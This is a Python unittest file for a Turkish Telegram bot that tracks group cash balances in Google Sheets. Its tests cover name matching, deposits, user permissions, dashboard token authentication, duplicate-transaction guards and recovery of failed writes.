        # 3. Test /kasa without params in group (should generate slip)
        sent_messages.clear()
        upd3 = {
            "message": {
                "chat": {"id": -100777, "title": "Sacid Operasyon"},
                "from": {"id": bot.KURUCU_ID},
                "text": "/kasa"
            }
        }
        bot.process_telegram_update(upd3)
        self.assertTrue(any("GÜNCEL KASA ANALİZİ" in m[1] and "SACİD" in m[1] for m in sent_messages))

class TestSmartCariQueryAndMultiWordMatching(unittest.TestCase):
    def setUp(self):
        bot.cache_temizle_impl()
        bot._yetkisiz_uyarilanlar.clear()
        
        self.mock_daily_sheet = MagicMock()
        self.mock_daily_sheet.title = "10.09.2026"
        self.sample_rows = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Komisyon", "Kalan"],
            ["1", "SACİD", "-1.195.300,00", "10.185.753,00", "0,00", "128.820,00", "8.861.633,00"],
            ["2", "BABA", "0,00", "1.570.000,00", "1.538.600,00", "31.400,00", "0,00"],
            ["3", "EŞREF TETHER", "0,00", "500.000,00", "0,00", "10.000,00", "490.000,00"],
            ["4", "GNL TETHER", "0,00", "200.000,00", "0,00", "4.000,00", "196.000,00"],
            ["5", "GENEL TOPLAM", "-1.195.300,00", "12.455.753,00", "1.538.600,00", "174.220,00", "9.547.633,00"]
        ]
        self.mock_daily_sheet.get_all_values.return_value = self.sample_rows
        
        mock_sh = MagicMock()
        mock_sh.worksheets.return_value = [self.mock_daily_sheet]
        mock_sh.worksheet.return_value = self.mock_daily_sheet
        
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=self.mock_daily_sheet)
        bot.get_sheet_values_fast = MagicMock(return_value=self.sample_rows)
        bot.telegramMesajDuzenle = _ORIG_TELEGRAM_MESAJ_DUZENLE
        bot.telegramMesajGonder = _ORIG_TELEGRAM_MESAJ_GONDER
        bot.telegramMesajSil = _ORIG_TELEGRAM_MESAJ_SIL
        bot.app_state["KISITLI_YETKILILER"] = dict(bot.KISITLI_YETKILILER)

    def test_cari_satir_bul_unit(self):
        # 1. Exact match single word
        idx, row, real_name, cand = bot.cari_satir_bul(self.sample_rows, "baba")
        self.assertEqual(idx, 3)
        self.assertEqual(real_name, "BABA")
        self.assertEqual(cand, [])

        # 2. Exact match multi-word (case & Turkish variations)
        idx, row, real_name, cand = bot.cari_satir_bul(self.sample_rows, "eşref tether")
        self.assertEqual(idx, 4)
        self.assertEqual(real_name, "EŞREF TETHER")
        self.assertEqual(cand, [])

        idx, row, real_name, cand = bot.cari_satir_bul(self.sample_rows, "EŞREF TETHER")
        self.assertEqual(idx, 4)
        self.assertEqual(real_name, "EŞREF TETHER")

        idx, row, real_name, cand = bot.cari_satir_bul(self.sample_rows, "esref tether")
        self.assertEqual(idx, 4)
        self.assertEqual(real_name, "EŞREF TETHER")

        # 3. Starts-with partial match (e.g. "esref" -> "EŞREF TETHER")
        idx, row, real_name, cand = bot.cari_satir_bul(self.sample_rows, "esref")
        self.assertEqual(idx, 4)
        self.assertEqual(real_name, "EŞREF TETHER")

        # 4. Starts-with partial match (e.g. "gnl" -> "GNL TETHER")
        idx, row, real_name, cand = bot.cari_satir_bul(self.sample_rows, "gnl")
        self.assertEqual(idx, 5)
        self.assertEqual(real_name, "GNL TETHER")

        # 5. Multiple matches disambiguation (e.g. "tether" matches both EŞREF TETHER and GNL TETHER)
        idx, row, real_name, cand = bot.cari_satir_bul(self.sample_rows, "tether")
        self.assertIsNone(idx)
        self.assertIn("EŞREF TETHER", cand)
        self.assertIn("GNL TETHER", cand)

        # 6. Non-existent group
        idx, row, real_name, cand = bot.cari_satir_bul(self.sample_rows, "bilinmeyen_cari")
        self.assertIsNone(idx)
        self.assertEqual(cand, [])

    def test_grup_kasa_analiz_fisi_uret_cases(self):
        # 1. Multi-word cari
        msg, kb = bot.grup_kasa_analiz_fisi_uret("eşref tether")
        self.assertIn("[ EŞREF TETHER ] GÜNCEL KASA ANALİZİ", msg)
        self.assertIn("500.000,00 ₺", msg)
        self.assertIn("490.000,00 ₺", msg)

        # 2. Uppercase multi-word cari
        msg, kb = bot.grup_kasa_analiz_fisi_uret("EŞREF TETHER")
        self.assertIn("[ EŞREF TETHER ] GÜNCEL KASA ANALİZİ", msg)

        # 3. Partial cari name ("gnl")
        msg, kb = bot.grup_kasa_analiz_fisi_uret("gnl")
        self.assertIn("[ GNL TETHER ] GÜNCEL KASA ANALİZİ", msg)

        # 4. Disambiguation when multiple match ("tether")
        msg, kb = bot.grup_kasa_analiz_fisi_uret("tether")
        self.assertIn("Birden Fazla Cari Eşleşti", msg)
        self.assertIn("/kasa EŞREF TETHER", msg)
        self.assertIn("/kasa GNL TETHER", msg)

        # 5. Non-existent cari raises ValueError with suggestions
        with self.assertRaises(ValueError) as ctx:
            bot.grup_kasa_analiz_fisi_uret("yok_boyle_biri")
        self.assertIn("Tabloda '<b>yok_boyle_biri</b>' adlı grup bulunamadı", str(ctx.exception))
        self.assertIn("BABA", str(ctx.exception))

    def test_dm_kasa_queries_via_process_telegram_update(self):
        sent_messages = []
        def mock_send(c_id, text, reply_markup=None, **kwargs):
            sent_messages.append((c_id, text, reply_markup))
            return {"ok": True, "result": {"message_id": 123}}

        bot.telegramMesajGonder = mock_send
        bot._update_executor.submit = lambda fn, *a, **kw: MagicMock(result=lambda timeout=None: fn(*a, **kw))

        # 1. User writes /kasa baba in DM (Private chat id: 8395730761 > 0)
        sent_messages.clear()
        bot.process_telegram_update({
            "message": {
                "chat": {"id": 8395730761, "title": ""},
                "from": {"id": bot.KURUCU_ID},
                "text": "/kasa baba"
            }
        })
        self.assertTrue(any("GÜNCEL KASA ANALİZİ" in m[1] and "BABA" in m[1] for m in sent_messages))

        # 2. User writes /kasa eşref tether in DM (2 words, should NOT raise 'Lütfen geçerli bir sayısal tutar girin!')
        sent_messages.clear()
        bot.process_telegram_update({
            "message": {
                "chat": {"id": 8395730761, "title": ""},
                "from": {"id": bot.KURUCU_ID},
                "text": "/kasa eşref tether"
            }
        })
        self.assertTrue(any("GÜNCEL KASA ANALİZİ" in m[1] and "EŞREF TETHER" in m[1] for m in sent_messages))

        # 3. User writes /kasa EŞREF TETHER in DM
        sent_messages.clear()
        bot.process_telegram_update({
            "message": {
                "chat": {"id": 8395730761, "title": ""},
                "from": {"id": bot.KURUCU_ID},
                "text": "/kasa EŞREF TETHER"
            }
        })
        self.assertTrue(any("GÜNCEL KASA ANALİZİ" in m[1] and "EŞREF TETHER" in m[1] for m in sent_messages))

        # 4. User writes /durum eşref tether in DM
        sent_messages.clear()
        bot.process_telegram_update({
            "message": {
                "chat": {"id": 8395730761, "title": ""},
                "from": {"id": bot.KURUCU_ID},
                "text": "/durum eşref tether"
            }
        })
        self.assertTrue(any("GÜNCEL KASA ANALİZİ" in m[1] and "EŞREF TETHER" in m[1] for m in sent_messages))

        # 5. User writes without slash: 'kasa baba' in DM
        sent_messages.clear()
        bot.process_telegram_update({
            "message": {
                "chat": {"id": 8395730761, "title": ""},
                "from": {"id": bot.KURUCU_ID},
                "text": "kasa baba"
            }
        })
        self.assertTrue(any("GÜNCEL KASA ANALİZİ" in m[1] and "BABA" in m[1] for m in sent_messages))

        # 6. User writes /kasa without params in DM -> Guide message
        sent_messages.clear()
        bot.process_telegram_update({
            "message": {
                "chat": {"id": 8395730761, "title": ""},
                "from": {"id": bot.KURUCU_ID},
                "text": "/kasa"
            }
        })
        self.assertTrue(any("Cari Kasa Sorgulama Rehberi" in m[1] and "/kasa BABA" in m[1] for m in sent_messages))

    def test_restricted_user_can_query_multi_word_cari(self):
        sent_messages = []
        def mock_send(c_id, text, reply_markup=None, **kwargs):
            sent_messages.append((c_id, text, reply_markup))
            return {"ok": True, "result": {"message_id": 123}}

        bot.telegramMesajGonder = mock_send
        bot._update_executor.submit = lambda fn, *a, **kw: MagicMock(result=lambda timeout=None: fn(*a, **kw))

        # Restricted user id: 8401305264 (@sacidc) queries /kasa eşref tether
        sent_messages.clear()
        bot.process_telegram_update({
            "message": {
                "chat": {"id": 8401305264, "title": ""},
                "from": {"id": 8401305264},
                "text": "/kasa eşref tether"
            }
        })
        # Must NOT send "Yetkisiz İşlem" warning!
        self.assertFalse(any("Yetkisiz İşlem" in m[1] for m in sent_messages))
        self.assertTrue(any("GÜNCEL KASA ANALİZİ" in m[1] and "EŞREF TETHER" in m[1] for m in sent_messages))

    def test_multi_word_cari_deposit(self):
        # Test depositing to a multi-word cari: /kasa EŞREF TETHER 50000
        bot._kuyruga_sayfa_yazma_ekle = MagicMock()
        bot.sistemeLogYaz = MagicMock()
        bot._islem_kaydet = MagicMock()
        
        res = bot.hucreyeVeriYaz_impl("/kasa EŞREF TETHER 50000", 4, "Kasa Ekleme", 1)
        self.assertIn("Kasa Ekleme Başarılı", res)
        self.assertIn("EŞREF TETHER", res)
        self.assertIn("50.000,00 ₺", res)

        # Test depositing with spaced number: /kasa EŞREF TETHER 1 500 000
        res2 = bot.hucreyeVeriYaz_impl("/kasa EŞREF TETHER 1 500 000", 4, "Kasa Ekleme", 1)
        self.assertIn("Kasa Ekleme Başarılı", res2)
        self.assertIn("EŞREF TETHER", res2)
        self.assertIn("1.500.000,00 ₺", res2)

    def test_security_dashboard_auth_token(self):
        import urllib.parse
        from bot import LiveDashboardHandler
        
        handler = object.__new__(LiveDashboardHandler)
        handler.headers = {}
        
        # 1. Unset/Empty token secret must reject access
        url_empty = urllib.parse.urlparse("http://localhost:8080/api/bilanco?token=secret123")
        self.assertFalse(handler._check_auth(url_empty, token_secret=""))
        
        # 2. Wrong token must reject
        url_wrong = urllib.parse.urlparse("http://localhost:8080/api/bilanco?token=wrong_token")
        self.assertFalse(handler._check_auth(url_wrong, token_secret="secret123"))
        
        # 3. Matching token in query string
        url_ok = urllib.parse.urlparse("http://localhost:8080/api/bilanco?token=secret123")
        self.assertTrue(handler._check_auth(url_ok, token_secret="secret123"))
        
        # 4. Matching token in X-Dashboard-Token header
        url_no_query = urllib.parse.urlparse("http://localhost:8080/api/bilanco")
        handler.headers = {"X-Dashboard-Token": "secret123"}
        self.assertTrue(handler._check_auth(url_no_query, token_secret="secret123"))
        
        # 5. Matching token in Authorization Bearer header
        handler.headers = {"Authorization": "Bearer secret123"}
        self.assertTrue(handler._check_auth(url_no_query, token_secret="secret123"))

        # 6. Matching token in Cookie header
        handler.headers = {"Cookie": "other=123; dashboard_token=secret123; foo=bar"}
        self.assertTrue(handler._check_auth(url_no_query, token_secret="secret123"))

        # 7. panel_linki_uret returns URL with valid token
        p_url = bot.panel_linki_uret()
        self.assertIn("token=", p_url)
        self.assertIn(bot.DASHBOARD_AUTH_TOKEN, p_url)

        # 8. GET / without token must return 401 Unauthorized and not leak token
        import io
        handler_unauth = object.__new__(LiveDashboardHandler)
        handler_unauth.path = "/"
        handler_unauth.headers = {}
        handler_unauth.wfile = io.BytesIO()
        handler_unauth.send_response = MagicMock()
        handler_unauth.send_header = MagicMock()
        handler_unauth.end_headers = MagicMock()
        handler_unauth.do_GET()
        
        body_unauth = handler_unauth.wfile.getvalue().decode("utf-8")
        self.assertIn("Yetkisiz Erişim", body_unauth)
        self.assertNotIn(bot.DASHBOARD_AUTH_TOKEN, body_unauth)
        handler_unauth.send_response.assert_called_with(401)

        # 9. GET /?token=... must return 200 OK and inject token
        handler_auth = object.__new__(LiveDashboardHandler)
        handler_auth.path = f"/?token={bot.DASHBOARD_AUTH_TOKEN}"
        handler_auth.headers = {}
        handler_auth.wfile = io.BytesIO()
        handler_auth.send_response = MagicMock()
        handler_auth.send_header = MagicMock()
        handler_auth.end_headers = MagicMock()
        handler_auth.do_GET()
        
        body_auth = handler_auth.wfile.getvalue().decode("utf-8")
        self.assertIn("CFO Canlı Finans Paneli", body_auth)
        self.assertIn(bot.DASHBOARD_AUTH_TOKEN, body_auth)
        handler_auth.send_response.assert_called_with(200)

        # 10. GET / with valid cookie must return 200 OK
        handler_cookie = object.__new__(LiveDashboardHandler)
        handler_cookie.path = "/"
        handler_cookie.headers = {"Cookie": f"dashboard_token={bot.DASHBOARD_AUTH_TOKEN}"}
        handler_cookie.wfile = io.BytesIO()
        handler_cookie.send_response = MagicMock()
        handler_cookie.send_header = MagicMock()
        handler_cookie.end_headers = MagicMock()
        handler_cookie.do_GET()
        
        body_cookie = handler_cookie.wfile.getvalue().decode("utf-8")
        self.assertIn("CFO Canlı Finans Paneli", body_cookie)
        handler_cookie.send_response.assert_called_with(200)

    def test_realtime_sheets_sync_and_broadcast(self):
        import queue, json
        # 1. Test fallback calculation for Kalan in tablodan_finans_ozeti_hesapla
        test_sheet = [
            ["Tarih/Saat", "GRUPLAR", "DEVİR / BORÇ", "GÜNCEL KASA", "ÖDENEN", "KOMİSYON", "KALAN KASA"],
            ["17.09.2026 12:00", "YENİ TİGER", "0,00", "3.000.000,00", "50.000,00", "60.000,00", "0,00"]
        ]
        finans = bot.tablodan_finans_ozeti_hesapla(test_sheet)
        tiger = next(g for g in finans["aktif_gruplar"] if g["ad"] == "YENİ TİGER")
        self.assertEqual(tiger["odenen"], 50000.0)
        # Should automatically calculate 3.000.000 - 50.000 - 60.000 = 2.890.000 even though sheet had 0,00
        self.assertEqual(tiger["kalan"], 2890000.0)

        # 2. Test cache synchronization
        bot.set_sheet_cache_matrix("17.09.2026", test_sheet)
        with bot._cached_sheet_matrix_lock:
            cached_data = bot._cached_sheet_matrices.get("17.09.2026")
            self.assertIsNotNone(cached_data)
            self.assertEqual(cached_data["data"][1][1], "YENİ TİGER")

        # 3. Test real-time SSE broadcast delivers fresh data matching notification
        test_q = queue.Queue(maxsize=10)
        with bot._sse_clients_lock:
            bot._sse_clients.add(test_q)

        try:
            bot.broadcast_dashboard_update(
                updated_groups=["YENİ TİGER"],
                group_changes=[{"grup": "YENİ TİGER", "message": "💸 YENİ TİGER grubuna 50.000,00 ₺ ödeme yapıldı."}],
                veriler=test_sheet,
                finans=finans,
                sheet_title="17.09.2026"
            )
            raw_msg = test_q.get_nowait()
            self.assertTrue(raw_msg.startswith("data: "))
            payload = json.loads(raw_msg[6:].strip())
            
            # Both notification AND updated card data must match
            self.assertEqual(len(payload["group_changes"]), 1)
            self.assertIn("50.000,00 ₺ ödeme yapıldı", payload["group_changes"][0]["message"])
            
            p_tiger = next(g for g in payload["gruplar"] if g["ad"] == "YENİ TİGER")
            self.assertEqual(p_tiger["odenen"], 50000.0)
            self.assertEqual(p_tiger["kalan"], 2890000.0)
            self.assertIn("YENİ TİGER", payload["updated_groups"])
        finally:
            with bot._sse_clients_lock:
                bot._sse_clients.discard(test_q)

    def test_dashboard_advanced_features_manifest_sheets_list_and_history(self):
        import io, json
        from bot import LiveDashboardHandler
        
        # 1. Test /manifest.json (PWA Support)
        h_manifest = object.__new__(LiveDashboardHandler)
        h_manifest.path = "/manifest.json"
        h_manifest.headers = {}
        h_manifest.wfile = io.BytesIO()
        h_manifest.send_response = MagicMock()
        h_manifest.send_header = MagicMock()
        h_manifest.end_headers = MagicMock()
        h_manifest.do_GET()
        
        h_manifest.send_response.assert_called_with(200)
        manifest_data = json.loads(h_manifest.wfile.getvalue().decode("utf-8"))
        self.assertEqual(manifest_data.get("display"), "standalone")
        self.assertEqual(manifest_data.get("name"), "CFO Canlı Finans Paneli")

        # 2. Test /api/sheets_list unauthorized
        h_unauth_list = object.__new__(LiveDashboardHandler)
        h_unauth_list.path = "/api/sheets_list"
        h_unauth_list.headers = {}
        h_unauth_list.wfile = io.BytesIO()
        h_unauth_list.send_response = MagicMock()
        h_unauth_list.send_header = MagicMock()
        h_unauth_list.end_headers = MagicMock()
        h_unauth_list.do_GET()
        h_unauth_list.send_response.assert_called_with(401)

        # 3. Test /api/sheets_list authorized
        h_auth_list = object.__new__(LiveDashboardHandler)
        h_auth_list.path = f"/api/sheets_list?token={bot.DASHBOARD_AUTH_TOKEN}"
        h_auth_list.headers = {}
        h_auth_list.wfile = io.BytesIO()
        h_auth_list.send_response = MagicMock()
        h_auth_list.send_header = MagicMock()
        h_auth_list.end_headers = MagicMock()
        
        mock_ws1 = MagicMock()
        mock_ws1.title = "17.09.2026"
        mock_ws2 = MagicMock()
        mock_ws2.title = "16.09.2026"
        with patch.object(bot, "get_spreadsheet") as mock_get_sh, \
             patch.object(bot, "get_active_daily_sheet") as mock_get_active, \
             patch.object(bot, "is_valid_daily_sheet", return_value=True):
            mock_sh = MagicMock()
            mock_sh.worksheets.return_value = [mock_ws1, mock_ws2]
            mock_get_sh.return_value = mock_sh
            mock_get_active.return_value = mock_ws1
            
            h_auth_list.do_GET()
            h_auth_list.send_response.assert_called_with(200)
            sheets_data = json.loads(h_auth_list.wfile.getvalue().decode("utf-8"))
            self.assertEqual(sheets_data["aktif"], "17.09.2026")
            self.assertIn("17.09.2026", sheets_data["tarihler"])
            self.assertIn("16.09.2026", sheets_data["tarihler"])

        # 4. Test HTML contains all 6 feature UI elements
        h_html = object.__new__(LiveDashboardHandler)
        h_html.path = f"/?token={bot.DASHBOARD_AUTH_TOKEN}"
        h_html.headers = {}
        h_html.wfile = io.BytesIO()
        h_html.send_response = MagicMock()
        h_html.send_header = MagicMock()
        h_html.end_headers = MagicMock()
        h_html.do_GET()
        
        body = h_html.wfile.getvalue().decode("utf-8")
        self.assertIn('id="search-input"', body)
        self.assertIn('id="privacy-btn"', body)
        self.assertIn('id="sound-btn"', body)
        self.assertIn('id="date-select"', body)
        self.assertIn('class="liquidity-box"', body)
        self.assertIn('rel="manifest"', body)

    def test_security_anonymous_admin_message(self):
        # Anonymous admin messages have 'sender_chat' instead of 'from'
        anon_update = {
            "update_id": 999111,
            "message": {
                "message_id": 1001,
                "chat": {"id": -1001999999, "title": "Anonim VIP Grup"},
                "sender_chat": {"id": -1001999999, "title": "Anonim VIP Grup"},
                "text": "/id"
            }
        }
        with patch.object(bot, "telegramMesajGonder") as mock_send:
            # Must process without throwing KeyError: 'from'
            bot.process_telegram_update(anon_update)
            self.assertTrue(mock_send.called)
            args = mock_send.call_args[0]
            self.assertEqual(args[0], -1001999999)
            self.assertIn("Telegram Kullanıcı Bilginiz", args[1])

    def test_security_yenigun_admin_and_kurucu_allowed(self):
        # 1. Non-admin user cannot execute yenigun_onay_sil or yenigun_onay_tut
        callback_unauth = {
            "update_id": 888222,
            "callback_query": {
                "id": "cb_test_123",
                "from": {"id": 999999999}, # Neither Kurucu nor Admin
                "message": {
                    "message_id": 2002,
                    "chat": {"id": -1001112233}
                },
                "data": "yenigun_onay_sil"
            }
        }
        with patch.object(bot, "yetkisiz_uyari_gonder") as mock_warn, \
             patch.object(bot, "yenigun_gerceklestir_impl") as mock_exec:
            bot.process_telegram_update(callback_unauth)
            self.assertTrue(mock_warn.called)
            self.assertFalse(mock_exec.called)

        # 2. Kurucu can execute
        callback_kurucu = {
            "update_id": 888223,
            "callback_query": {
                "id": "cb_test_kurucu",
                "from": {"id": bot.KURUCU_ID},
                "message": {
                    "message_id": 2003,
                    "chat": {"id": -1001112233}
                },
                "data": "yenigun_onay_tut"
            }
        }
        with patch.object(bot, "yetkisiz_uyari_gonder") as mock_warn, \
             patch.object(bot, "yenigun_gerceklestir_impl") as mock_exec:
            bot.process_telegram_update(callback_kurucu)
            self.assertFalse(mock_warn.called)
            self.assertTrue(mock_exec.called)

        # 3. An Admin (EK_ADMINLER) can execute
        admin_id = 777888999
        bot.app_state["EK_ADMINLER"].add(admin_id)
        callback_admin = {
            "update_id": 888224,
            "callback_query": {
                "id": "cb_test_admin",
                "from": {"id": admin_id},
                "message": {
                    "message_id": 2004,
                    "chat": {"id": -1001112233}
                },
                "data": "yenigun_onay_sil"
            }
        }
        with patch.object(bot, "yetkisiz_uyari_gonder") as mock_warn, \
             patch.object(bot, "yenigun_gerceklestir_impl") as mock_exec:
            bot.process_telegram_update(callback_admin)
            self.assertFalse(mock_warn.called)
            self.assertTrue(mock_exec.called)

    def test_security_restricted_user_callbacks(self):
        # Restricted users must be able to close messages and view reports
        restricted_id = 8401305264
        callback_close = {
            "update_id": 777333,
            "callback_query": {
                "id": "cb_close_123",
                "from": {"id": restricted_id},
                "message": {
                    "message_id": 3003,
                    "chat": {"id": restricted_id}
                },
                "data": "mesaj_kapat"
            }
        }
        with patch.object(bot, "telegramMesajSil") as mock_del, \
             patch.object(bot, "telegram_api") as mock_api:
            bot.process_telegram_update(callback_close)
            self.assertTrue(mock_del.called)

    def test_cmd_cariler_listesi_klavyesi_uret(self):
        metin, klavye = bot.cariler_listesi_klavyesi_uret(0)
        self.assertIn("ŞİRKET AKTİF CARİ LİSTESİ", metin)
        self.assertIn("inline_keyboard", klavye)
        ik = klavye["inline_keyboard"]
        # Must contain cari buttons
        found_cari_btn = False
        for row in ik:
            for btn in row:
                if btn.get("callback_data", "").startswith("rapor_"):
                    found_cari_btn = True
                    break
        self.assertTrue(found_cari_btn)

    def test_cmd_cariekle(self):
        # 1. No name provided
        res_empty = bot.cari_ekle_impl("/cariekle")
        self.assertIn("Kullanım:", res_empty)

        # 2. Existing cari
        res_exists = bot.cari_ekle_impl("/cariekle SACİD")
        self.assertIn("zaten", res_exists)

        # 3. New cari
        mock_sheet = MagicMock()
        mock_sheet.title = "10.09.2026"
        with patch.object(bot, "get_active_daily_sheet", return_value=mock_sheet), \
             patch.object(bot, "get_sheet_values_fast", return_value=[
                 ["Sıra", "Cari Adı", "Devir", "Kasa", "Ödenen", "Komisyon", "Kalan"],
                 ["1", "SACİD", "100", "0", "0", "0", "100"],
                 ["2", "GENEL TOPLAM", "100", "0", "0", "0", "100"]
             ]):
            res_new = bot.cari_ekle_impl("/cariekle YENİ VIP CARİ")
            self.assertIn("YENİ CARİ BAŞARIYLA EKLENDİ", res_new)
            self.assertIn("YENİ VIP CARİ", res_new)
            self.assertTrue(mock_sheet.insert_row.called or mock_sheet.update.called)

    def test_cmd_paylas(self):
        # 1. No arg
        res_empty = bot.musteri_paylasim_metni_uret("/paylas")
        self.assertIn("Kullanım:", res_empty)

        # 2. Valid cari
        res_ok = bot.musteri_paylasim_metni_uret("/paylas SACİD")
        self.assertIn("HESAP EKSTRESİ & GÜNCEL BAKİYE", res_ok)
        self.assertIn("SACİD", res_ok)
        self.assertIn("NET KALAN BAKİYE:", res_ok)

    def test_cmd_mutabakat(self):
        mock_sh = MagicMock()
        ws_today = MagicMock()
        ws_today.title = "10.09.2026"
        ws_yesterday = MagicMock()
        ws_yesterday.title = "09.09.2026"
        
        mock_sh.worksheets.return_value = [ws_today, ws_yesterday]
        
        # Perfect reconciliation
        def mock_values_fast(ws, **kwargs):
            if ws == ws_today:
                return [
                    ["Sıra", "Cari Adı", "Devir", "Kasa", "Ödenen", "Komisyon", "Kalan"],
                    ["1", "SACİD", "50000", "0", "0", "0", "50000"]
                ]
            else:
                return [
                    ["Sıra", "Cari Adı", "Devir", "Kasa", "Ödenen", "Komisyon", "Kalan"],
                    ["1", "SACİD", "0", "50000", "0", "0", "50000"]
                ]
                
        with patch.object(bot, "get_spreadsheet", return_value=mock_sh), \
             patch.object(bot, "get_sheet_values_fast", side_effect=mock_values_fast):
            res = bot.dunku_bugunku_mutabakat_denetimi_impl()
            self.assertIn("MUTABAKAT DENETİMİ: KUSURSUZ", res)
            self.assertIn("%100", res)

    def test_cmd_hareketler(self):
        res = bot.cari_gunluk_hareketler_impl("/hareketler SACİD")
        self.assertIn("GÜNLÜK CARİ HAREKET VE FORMÜL DÖKÜMÜ", res)
        self.assertIn("SACİD", res)

    def test_cmd_kuyruk(self):
        res = bot.kuyruk_durumu_impl()
        self.assertIn("GOOGLE SHEETS YAZMA KUYRUĞU", res)
        self.assertIn("Telegram Yanıt Süresi", res)

    def test_cmd_apidurum(self):
        with patch.object(bot, "telegram_api", return_value={"ok": True}):
            res = bot.api_saglik_durumu_impl()
            self.assertIn("SİSTEM & APİ SAĞLIK DURUMU", res)
            self.assertIn("Telegram Bot API", res)
            self.assertIn("Google Sheets API", res)

    def test_idempotency_guard(self):
        # 1. İlk finansal komut başarılı geçmelidir
        dup, elapsed = bot.mukerrer_islem_mi(12345, "/kasa SACİD 500000")
        self.assertFalse(dup)
        self.assertEqual(elapsed, 0.0)

        # 2. 3.5 saniye içindeki aynı komut mükerrer olarak engellenmelidir
        dup, elapsed = bot.mukerrer_islem_mi(12345, "/kasa SACİD 500000")
        self.assertTrue(dup)
        self.assertGreaterEqual(elapsed, 0.0)

        # 3. Sadece bakiye sorgulayan komutlar (rakamsız) asla engellenmemelidir
        dup1, _ = bot.mukerrer_islem_mi(12345, "/kasa SACİD")
        dup2, _ = bot.mukerrer_islem_mi(12345, "/kasa SACİD")
        self.assertFalse(dup1)
        self.assertFalse(dup2)

        # 4. Farklı tutar veya farklı kullanıcı serbesttir
        dup, _ = bot.mukerrer_islem_mi(12345, "/kasa SACİD 600000")
        self.assertFalse(dup)
        dup, _ = bot.mukerrer_islem_mi(99999, "/kasa SACİD 500000")
        self.assertFalse(dup)

        # 5. Finansal olmayan komutlar (/rehber, /status vb.) asla engellenmez
        dup1, _ = bot.mukerrer_islem_mi(12345, "/rehber")
        dup2, _ = bot.mukerrer_islem_mi(12345, "/rehber")
        self.assertFalse(dup1)
        self.assertFalse(dup2)

    def test_idempotency_dispatch_blocks_duplicate(self):
        sent_messages = []
        with patch.object(bot, "telegramMesajGonder", side_effect=lambda cid, text, *args, **kwargs: sent_messages.append(text)), \
             patch.object(bot, "yetkili_mi", return_value=True), \
             patch.object(bot, "kullanici_kisitli_mi", return_value=False):
            
            # İlk komut işlenir ve önbelleğe alınır
            bot.mukerrer_islem_mi(bot.KURUCU_ID, "/kasa SACİD 1000")
            
            # Aynı komut Telegram update olarak geldiğinde engellenmelidir
            update = {
                "message": {
                    "chat": {"id": 111, "title": "Test Chat"},
                    "from": {"id": bot.KURUCU_ID},
                    "text": "/kasa SACİD 1000"
                }
            }
            bot._process_telegram_update_core(update)
            self.assertTrue(any("Mükerrer İşlem Engellendi" in m for m in sent_messages))

    def test_dead_letter_queue_and_kurtar(self):
        # 1. Başarısız işlem yokken tertemiz mesajı dönmelidir
        res_empty = bot.kurtar_basarisiz_yazimlari_impl()
        self.assertIn("HATA KURTARMA KUYRUĞU TERTEMİZ", res_empty)

        # 2. Hatalı işlem simüle edilip kuyruğa eklenir
        item = {
            "id": "write_test_123",
            "sayfa": "Sayfa1",
            "satir": 5,
            "sutun": 4,
            "val": "50000",
            "hata": "API Rate Limit 429",
            "zaman": 1234567890.0,
            "deneme_sayisi": 3,
            "son_deneme": 1234567890.0
        }
        with bot._sheet_failed_writes_lock:
            bot._sheet_failed_writes.append(item)

        # 3. /kuyruk raporunda DLQ sayısı ve kurtar uyarısı görünmelidir
        kuyruk_res = bot.kuyruk_durumu_impl()
        self.assertIn("Hata Kurtarma (DLQ)", kuyruk_res)
        self.assertIn("1</b> başarısız işlem bekliyor", kuyruk_res)
        self.assertIn("/kurtar", kuyruk_res)

        # 4. Kurtar çalıştırıldığında Sheets API'ye yazar ve DLQ'dan temizler
        mock_ws = MagicMock()
        mock_sh = MagicMock()
        mock_sh.worksheet.return_value = mock_ws
        
        with patch.object(bot, "get_spreadsheet", return_value=mock_sh), \
             patch.object(bot, "_save_failed_writes"):
            res_kurtar = bot.kurtar_basarisiz_yazimlari_impl()
            self.assertIn("TÜM BAŞARISIZ İŞLEMLER KURTARILDI", res_kurtar)
            self.assertEqual(len(bot._sheet_failed_writes), 0)
            mock_ws.update_cell.assert_called_once_with(5, 4, "50000")

        # 5. Kısmi kurtarma / Hata durumu testi
        item_fail = {
            "id": "write_fail_999",
            "sayfa": "Sayfa1",
            "satir": 10,
            "sutun": 4,
            "val": "1000",
            "hata": "Initial Error",
            "zaman": 1234567890.0,
            "deneme_sayisi": 3,
            "son_deneme": 1234567890.0
        }
        with bot._sheet_failed_writes_lock:
            bot._sheet_failed_writes.append(item_fail)

        mock_fail_ws = MagicMock()
        mock_fail_ws.update_cell.side_effect = Exception("Sheets network timeout")
        mock_fail_sh = MagicMock()
        mock_fail_sh.worksheet.return_value = mock_fail_ws

        with patch.object(bot, "get_spreadsheet", return_value=mock_fail_sh), \
             patch.object(bot, "_save_failed_writes"):
            res_partial = bot.kurtar_basarisiz_yazimlari_impl()
            self.assertIn("KISMİ KURTARMA RAPORU", res_partial)
            self.assertIn("Hala Hata Veren", res_partial)
            self.assertEqual(len(bot._sheet_failed_writes), 1)
            self.assertEqual(bot._sheet_failed_writes[0]["deneme_sayisi"], 4)

    def test_cmd_kurtar_dispatch(self):
        with patch.object(bot, "kurtar_basarisiz_yazimlari_impl", return_value="KURTARMA_TAMAMLANDI") as mock_kurtar, \
             patch.object(bot, "telegramMesajGonder"), \
             patch.object(bot, "yetkili_mi", return_value=True), \
             patch.object(bot, "kullanici_kisitli_mi", return_value=False):
            update = {
                "message": {
                    "chat": {"id": 111},
                    "from": {"id": bot.KURUCU_ID},
                    "text": "/kurtar"
                }
            }
            bot._process_telegram_update_core(update)
            mock_kurtar.assert_called_once()

    def test_callback_kurtar_and_kuyruk_yenile(self):
        sent_messages = []
        with patch.object(bot, "telegramMesajGonder", side_effect=lambda cid, text, *args, **kwargs: sent_messages.append(text)), \
             patch.object(bot, "telegramMesajDuzenle") as mock_edit, \
             patch.object(bot, "telegram_api", return_value={"ok": True}), \
             patch.object(bot, "yetkili_mi", return_value=True), \
             patch.object(bot, "kullanici_kisitli_mi", return_value=False):
            
            # Callback: kuyruk_yenile
            cq_update = {
                "callback_query": {
                    "id": "cq_1",
                    "from": {"id": bot.KURUCU_ID},
                    "data": "kuyruk_yenile",
                    "message": {"message_id": 999, "chat": {"id": 111}}
                }
            }
            bot._process_telegram_update_core(cq_update)
            mock_edit.assert_called_once()
            args, _ = mock_edit.call_args
            self.assertEqual(args[0], 111)
            self.assertEqual(args[1], 999)
